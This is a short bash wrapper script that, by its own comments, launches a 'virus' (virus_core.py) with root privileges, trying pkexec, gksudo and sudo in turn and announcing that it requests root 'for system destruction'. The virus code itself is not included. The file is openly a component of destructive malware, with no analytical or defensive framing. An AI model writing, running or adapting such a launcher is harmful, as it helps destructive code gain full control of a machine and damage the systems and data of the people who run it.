#!/bin/bash
# Wrapper script to run virus with root privileges

cd "$(dirname "$0")"

# Check if already root
if [ "$EUID" -eq 0 ]; then
    echo "Already running as root"
    python3 virus_core.py "$@"
    exit $?
fi

# Try to get root privileges
echo "Requesting root privileges for system destruction..."

# Try different methods to get root
if command -v pkexec &> /dev/null; then
    pkexec python3 virus_core.py "$@"
elif command -v gksudo &> /dev/null; then
    gksudo python3 virus_core.py "$@"
elif command -v sudo &> /dev/null; then
    sudo python3 virus_core.py "$@"
else
    echo "Error: Cannot get root privileges. Running without root (may fail)."
    python3 virus_core.py "$@"
fi

